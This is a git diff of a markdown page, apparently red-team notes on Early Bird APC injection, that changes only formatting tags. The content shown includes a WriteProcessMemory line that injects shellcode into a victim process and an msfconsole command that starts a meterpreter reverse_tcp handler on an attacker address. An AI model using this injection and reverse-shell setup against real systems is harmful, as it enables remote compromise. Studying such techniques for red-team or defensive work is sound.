@@ -44,13 +44,11 @@ WriteProcessMemory(victimProcess, shellAddress, buf, shellSize, NULL);
 
 Before continuing, let's fire up a multi handler on the attacking system so we can catch the meterpreter session:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/x64/meterpreter/reverse_tcp; exploit"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Back to executing the malicious code - once the shellcode is written into the process memory, the APC is queued to the thread which is then immediately resumed. Resuming the thread in turn executes the shellcode which results in a meterpreter session:
 
@@ -58,8 +56,7 @@ Back to executing the malicious code - once the shellcode is written into the pr
 
 ## Code
 
-{% tabs %}
-{% tab title="earlybird-apc.cpp" %}
+{% code title="earlybird-apc.cpp" %}
 ```cpp
 #include "pch.h"
 #include <Windows.h>
@@ -85,8 +82,7 @@ int main()
 	return 0;
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## References
 
